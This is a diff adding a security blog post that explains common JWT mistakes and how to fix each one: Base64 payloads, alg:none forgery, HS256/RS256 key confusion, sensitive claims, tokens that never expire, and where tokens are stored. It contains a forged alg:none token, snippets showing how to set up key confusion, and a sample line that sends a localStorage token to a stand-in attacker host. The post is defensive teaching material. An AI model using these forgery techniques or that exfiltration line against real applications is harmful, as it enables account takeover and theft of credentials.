@@ -1,0 +1,154 @@
+---
+layout: base.njk
+title: "JWT is not encryption — Penumbra Forge"
+description: "JWTs are signed, not encrypted. Base64 is not a security boundary. Here's what keeps going wrong with JSON Web Tokens — alg:none attacks, key confusion, payload leaks, and tokens that never expire."
+permalink: /blog/jwt-is-not-encryption/
+---
+
+<link rel="stylesheet" href="/css/blog.css">
+
+<header class="site-header" id="site-header">
+  <a href="/" class="site-header-brand" title="Penumbra Forge">
+    <div class="site-header-orb" aria-hidden="true"><div class="site-header-orb-backlight"></div><div class="site-header-orb-corona"></div><div class="site-header-orb-glow"></div><div class="site-header-orb-edge"></div><div class="site-header-orb-shadow"></div></div>
+  </a>
+  <button class="site-header-toggle" aria-label="Toggle menu"><svg width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.5"><line x1="3" y1="5" x2="17" y2="5"/><line x1="3" y1="10" x2="17" y2="10"/><line x1="3" y1="15" x2="17" y2="15"/></svg></button>
+  <nav class="site-header-nav">
+    <a href="/">Home</a>
+    <a href="/tools/">Tools</a>
+    <a href="/labs/">Labs</a>
+    <a href="/blog/" class="active">Blog</a>
+    <a href="/gate/">Gate</a>
+    <a href="/librarian/">Librarian</a>
+    <a href="https://github.com/penumbraforge" target="_blank" rel="noopener">GitHub</a>
+  </nav>
+</header>
+
+<div class="blog-page">
+  <article class="blog-article">
+    <div class="blog-article-header">
+      <h1>JWT is not encryption</h1>
+      <div class="blog-post-meta">
+        <span class="blog-post-date">March 26, 2026</span>
+        <span class="blog-post-tag">security</span>
+        <span class="blog-post-tag">authentication</span>
+        <span class="blog-post-read">7 min read</span>
+      </div>
+    </div>
+
+    <p class="blog-article-lede">I review authentication implementations regularly. The single most common misunderstanding I encounter is that a JWT protects the data inside it. It doesn't. A JWT is a signed envelope with a clear window. Anyone who intercepts it can read everything in the payload. The signature proves integrity — that nobody tampered with the contents. It says nothing about confidentiality.</p>
+
+    <div class="blog-body">
+      <h2>Base64 is not encryption</h2>
+      <p>A JWT has three parts separated by dots: header, payload, signature. The first two are just Base64URL-encoded JSON. No key required. No decryption step. You paste it into any decoder — or run <code>atob()</code> in your browser console — and the payload is right there in plaintext.</p>
+      <p>Here's a real JWT (don't worry, I generated this one for the post):</p>
+
+      <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDQ4NTc2IiwibmFtZSI6IkphbmUgQ2hlbiIsImVtYWlsIjoiamNoZW5AZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDI5NDg4MDB9.8KzV3x7mQfYsGp0r2nHcX5kJ6LbWq9Tv1dMzRpOuYWk</code></pre>
+
+      <p>That looks opaque. It's not. Grab the middle section — everything between the first and second dot — and decode it:</p>
+
+      <pre><code>$ echo 'eyJzdWIiOiIxMDQ4NTc2IiwibmFtZSI6IkphbmUgQ2hlbiIsImVtYWlsIjoiamNoZW5AZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDI5NDg4MDB9' | base64 -d
+
+{"sub":"1048576","name":"Jane Chen","email":"jchen@example.com","role":"admin","iat":1742948800}</code></pre>
+
+      <p>Name, email, role, user ID. Fully readable. No secret. No key. Just Base64.</p>
+      <p>If you're putting data into a JWT and assuming it's hidden because the token "looks encrypted," you're leaking that data to anyone who touches the token — browser extensions, proxy logs, CDN edge nodes, anything that can read an <code>Authorization</code> header.</p>
+
+      <h2>The <code>alg: "none"</code> attack</h2>
+      <p>The JWT spec (RFC 7519) includes an algorithm called <code>none</code>. It means "this token is unsigned." That's a legitimate use case for contexts where the transport layer provides integrity — but libraries that accept <code>alg: "none"</code> in production let attackers forge tokens trivially.</p>
+      <p>The attack works like this: take a valid JWT, decode the header, change the algorithm to <code>"none"</code>, modify the payload however you want, re-encode both parts, strip the signature, and send it. If the server's JWT library respects the <code>alg</code> field in the token instead of enforcing its own expected algorithm, the token validates.</p>
+
+      <pre><code>// Original header
+{"alg": "HS256", "typ": "JWT"}
+
+// Attacker's header
+{"alg": "none", "typ": "JWT"}
+
+// Attacker's payload — escalated to admin
+{"sub": "1048576", "name": "Jane Chen", "role": "admin", "iat": 1742948800}
+
+// Forged token (note: no signature after the final dot)
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDQ4NTc2IiwibmFtZSI6IkphbmUgQ2hlbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0Mjk0ODgwMH0.</code></pre>
+
+      <p>This isn't theoretical. CVE-2015-9235 hit the widely used <code>jsonwebtoken</code> Node.js library. Auth0's <code>node-jsonwebtoken</code> before version 4.2.2 would accept <code>alg: "none"</code> and skip signature verification entirely. Thousands of apps were vulnerable.</p>
+
+      <div class="blog-callout blog-callout-warning">
+        <strong>Fix:</strong> Never let the token tell your server which algorithm to use. Specify the algorithm explicitly when verifying: <code>jwt.verify(token, secret, { algorithms: ['HS256'] })</code>. If your library doesn't support an allowlist, replace it.
+      </div>
+
+      <h2>HS256 / RS256 key confusion</h2>
+      <p>This one is subtle and devastating. HS256 is symmetric — the same secret signs and verifies. RS256 is asymmetric — a private key signs, a public key verifies. Many JWT libraries accept either algorithm for the same verification call.</p>
+      <p>Here's the attack scenario: the server signs tokens with RS256 using its private key and verifies them with its public key. The attacker obtains the public key (which is, by design, public). The attacker then creates a new token, sets <code>alg</code> to <code>HS256</code>, and signs it using the public key as the HMAC secret.</p>
+      <p>When the server receives this token, a naive library sees <code>alg: "HS256"</code>, grabs the verification key (the public key), and runs HMAC verification using that key as the shared secret. The signature matches because the attacker signed it with the same key. The forged token passes verification.</p>
+
+      <pre><code>// Server expects RS256, verifies with public key
+jwt.verify(token, publicKey)
+
+// Attacker signs with HS256 using that same public key
+jwt.sign(forgedPayload, publicKey, { algorithm: 'HS256' })</code></pre>
+
+      <p>The root cause is the same as <code>alg: "none"</code> — trusting the token's header to dictate the verification algorithm. The fix is the same too: always specify the algorithm on the server side.</p>
+
+      <h2>Sensitive data in the payload</h2>
+      <p>I've seen JWTs in production containing Social Security numbers, internal database IDs that reveal total user counts, full street addresses, salary bands, and medical record identifiers. Every one of those was readable by opening DevTools and running <code>atob()</code> on the payload.</p>
+      <p>Some common examples of what doesn't belong in a JWT payload:</p>
+
+      <pre><code>// Don't do this
+{
+  "sub": "1048576",
+  "email": "jchen@example.com",
+  "ssn": "419-55-XXXX",
+  "salary_band": "L6",
+  "internal_role": "super_admin",
+  "db_server": "prod-db-03.internal.corp",
+  "feature_flags": ["beta_billing", "internal_audit_panel"]
+}</code></pre>
+
+      <p>The JWT should carry the minimum claims needed for authorization decisions. A user ID and an expiration timestamp. Maybe a role or scope. That's it. Everything else should be fetched server-side using the user ID as a lookup key.</p>
+      <p>And it's not just about interception. JWTs get logged. They appear in URLs as query parameters. They show up in error reports, APM traces, and browser history. Once the data is in the token, it spreads everywhere tokens spread.</p>
+
+      <h2>Tokens that live forever</h2>
+      <p>A JWT without an <code>exp</code> claim is valid until the end of time — or until you rotate the signing key and break every active session. Neither outcome is good.</p>
+      <p>I've seen access tokens with 30-day expirations. I've seen tokens with no expiration at all. When one of these leaks — and tokens leak constantly, through log aggregation, referer headers, shared URLs, browser extensions — the attacker has persistent access with no mechanism for revocation.</p>
+
+      <div class="blog-callout blog-callout-insight">
+        <strong>JWTs are stateless by design.</strong> That's the feature and the problem. There's no session table to delete from. You can't "log out" a JWT. Once issued, it's valid until it expires or the signing key changes. This is why access tokens should be short-lived (5-15 minutes) with a separate refresh token mechanism for obtaining new ones.
+      </div>
+
+      <p>If you need the ability to revoke a specific token — for example, when a user changes their password or an admin disables an account — you need a server-side denylist. At that point, you're adding state back into a stateless system. That's fine. Security is more important than architectural purity.</p>
+
+      <h2>Where you store the token matters</h2>
+      <p>The two most common storage locations are <code>localStorage</code> and <code>httpOnly</code> cookies. They have different threat profiles.</p>
+      <p><code>localStorage</code> is readable by any JavaScript running on the page. If your application has an XSS vulnerability — one unsanitized input, one compromised third-party script, one malicious browser extension with content script access — the attacker can read the token and exfiltrate it. Game over. The token works from any machine, any browser, anywhere in the world.</p>
+
+      <pre><code>// This is all it takes to steal a token from localStorage
+fetch('https://attacker.example/collect?token=' + localStorage.getItem('auth_token'))</code></pre>
+
+      <p>An <code>httpOnly</code> cookie can't be read by JavaScript. Period. The browser sends it automatically with requests to the origin, but no script — not even your own application code — can access its value. An XSS vulnerability can still make authenticated requests (the cookie is attached automatically), but it can't steal the token itself. The damage is limited to the duration of the XSS — close the page, and the attacker loses access.</p>
+      <p>The tradeoff: <code>httpOnly</code> cookies introduce CSRF risk. You need a CSRF token or <code>SameSite=Strict</code> to prevent cross-site request forgery. But CSRF is a solved problem with well-understood mitigations. XSS token theft is much harder to contain.</p>
+      <p>Use <code>httpOnly</code>, <code>Secure</code>, <code>SameSite=Strict</code> cookies. Accept the CSRF complexity. It's worth it.</p>
+
+      <h2>The actual purpose of a JWT</h2>
+      <p>A JWT provides <strong>integrity</strong>, not <strong>confidentiality</strong>. The signature proves that the payload was created by someone who holds the signing key and that nobody modified it in transit. That's all it does. That's all it needs to do.</p>
+      <p>Used correctly, JWTs are excellent. A short-lived access token with minimal claims, signed with a strong algorithm, verified with an explicit algorithm allowlist, stored in an httpOnly cookie, and backed by a refresh token mechanism — that's a solid authentication system.</p>
+      <p>The problems happen when developers treat the token as something it's not. It's not encrypted storage. It's not a session database. It's not a safe place for secrets. It's a signed assertion of identity with a built-in expiration. Respect that boundary and JWTs work well. Ignore it and you're building on a misunderstanding.</p>
+
+      <h2>See it for yourself</h2>
+      <p>Paste any JWT into the <a href="/tools/jwt-decoder/">Penumbra Forge JWT decoder</a> and watch the header and payload appear in plaintext instantly. No key needed. No API call. Everything happens in your browser. If seeing the decoded payload surprises you, that's the point of this post.</p>
+      <p>If you want to go further, the <a href="/labs/">JWT lab</a> lets you exploit the <code>alg: "none"</code> attack and key confusion vulnerability hands-on — real forged tokens against a real verification endpoint. Nothing simulated.</p>
+    </div>
+
+    <div class="blog-post-footer">
+      <div class="blog-author">
+        <div class="blog-author-avatar"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
+        <div>
+          <div class="blog-author-name">Shadoe Myers</div>
+          <div class="blog-author-role">Senior InfoSec Engineer — Penumbra Forge</div>
+        </div>
+      </div>
+      <div class="blog-nav-links">
+        <a href="/blog/" class="blog-nav-link">&larr; All posts</a>
+        <a href="/tools/jwt-decoder/" class="blog-nav-link">Decode a JWT &rarr;</a>
+      </div>
+    </div>
+  </article>
+</div>
